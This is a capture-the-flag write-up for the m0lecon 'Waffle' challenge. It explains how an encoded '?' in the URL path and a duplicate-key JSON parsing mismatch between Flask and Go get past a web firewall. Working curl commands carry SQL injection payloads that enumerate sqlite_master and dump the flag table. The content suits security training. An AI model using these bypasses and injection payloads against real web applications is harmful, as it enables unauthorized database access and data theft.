Waffle
---

In this challenge we were presented with a Golang HTTP server behind the Flask firewall. 

The goland server had 2 interesting endpoints, and so did the WAF:

1. `/gettoken`: this endpoint validated that the `promocode` get-parameter equals toi string `FREEWAF`, and thw WAF checks the contrary.
   To bypass the WAF, one can notice that Flask urldecodes the path, so we make the request to `/gettoken%3f?promocode=FREEWAF`, and the whole string will be considered as path, 
   so the get-parameter check will not trigger. After that, Flask will make the request to `appHost+path`, where the `path` is already urlencoded, effectively 
   passing the promocode as get-parameter.
   
Final request for (1):

```shell
curl -v --path-as-is "http://waffle.challs.m0lecon.it/gettoken%3fcreditcard=123&promocode=FREEWAF"
```

2. `/search`: this endpoint searches the database for waffles matching some criteria. There's a clear sql injection in all fields,
   but the WAF checks that all parameters are numbers or alphanumeric strings. However, after experimenting with the locally-deployed copy
   of the task, one can notice that Flask json decoding takes the last key occurrence if there are multiple, whereas the Golang decoder 
   (some external one) takes the first. This allows us to pass sql injection in the `name` field. First, we enumerate the tables 
   (using the token acquired in the step 1):
   
```shell
curl --path-as-is -XPOST --cookie "token=LQuKU5ViVGk4fsytWt9C" --data "{\"name\": \"' or 1=1 union select 1, 1, 1, name from sqlite_master where type = 'table' -- \", \"name\": \"flag\"}" "http://waffle.challs.m0lecon.it/search"
```

Which gives us the `flag` table. Then we can select everything from it, getting the flag:

```shell
curl --path-as-is -XPOST --cookie "token=LQuKU5ViVGk4fsytWt9C" --data "{\"name\": \"' or 1=1 union select 1, 1, 1, * from flag -- \", \"name\": \"flag\"}" "http://waffle.challs.m0lecon.it/search"
```

Flag: `ptm{n3ver_ev3r_tru5t_4_pars3r!}`   
